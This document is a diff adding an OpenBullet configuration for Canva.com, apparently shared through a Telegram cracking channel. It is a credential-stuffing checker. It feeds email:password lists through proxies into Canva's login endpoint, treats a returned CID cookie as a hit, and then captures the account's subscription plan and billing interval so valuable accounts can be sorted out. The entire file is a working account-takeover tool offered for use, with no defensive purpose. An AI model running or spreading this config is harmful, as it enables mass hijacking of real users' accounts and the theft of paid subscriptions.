@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "Canva.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-27T22:59:36.0178556+03:30",
+  "AdditionalInfo": "Telegram Channel: @OpenBulletChannel | Capture | CPM Rate: 10 _ 200",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#G REQUEST GET "https://www.canva.com/_ajax/csrf3/login2" 
+  
+  HEADER "Host: www.canva.com" 
+  HEADER "Accept: */*" 
+  HEADER "X-Canva-Device-Id: C1111A54-9104-4E20-A985-1D587DC5BD3C" 
+  HEADER "User-Agent: canvaeditor/3.84.0 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "Accept-Language: en-GB" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+#Token PARSE "<SOURCE>" LR ">//{\"A\":\"" "\"" -> VAR "Token" 
+
+#P REQUEST POST "https://www.canva.com/_ajax/login2" 
+  CONTENT "{\"F\":false,\"A\":{\"type\":\"EMAIL_PASSWORD\",\"email\":\"<USER>\",\"password\":\"<PASS>\"},\"C\":\"9D5E03B2-D6BE-4F80-835D-5095E10B5530\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Host: www.canva.com" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: close" 
+  HEADER "X-Canva-Device-Id: C1111A54-9104-4E20-A985-1D587DC5BD3C" 
+  HEADER "X-Csrf-Token: <Token>" 
+  HEADER "User-Agent: canvaeditor/3.84.0 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "Accept-Language: en-GB" 
+  HEADER "Content-Length: 138" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "CID" 
+  KEYCHAIN Failure OR 
+    KEY "The password you entered is incorrect." 
+    KEY "{\"statusCode\":404,\"error\":\"not found\"}" 
+
+#G REQUEST GET "https://www.canva.com/_ajax/subscription/subscriptions?limit=100&principals=%3ABAD4zck8CuM&projections=PRICE&projections=PLAN_DETAILS&projections=SUBSCRIPTION_REPLACEMENT&projections=PRICE_ADJUSTMENT&projections=LIVE_QUANTITY&projections=MANAGEMENT_URL&statuses=TRIALING&statuses=ACTIVE&statuses=PAUSED" 
+  
+  HEADER "Host: www.canva.com" 
+  HEADER "Accept: */*" 
+  HEADER "X-Canva-Device-Id: C1111A54-9104-4E20-A985-1D587DC5BD3C" 
+  HEADER "User-Agent: canvaeditor/3.84.0 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "Accept-Language: en-GB" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+#Sub PARSE "<SOURCE>" LR "name\":\"" "\"," -> CAP "Sub" 
+
+#billingInterval PARSE "<SOURCE>" LR "billingInterval\":\"" "\"," CreateEmpty=FALSE -> CAP "billing Interval" 
+
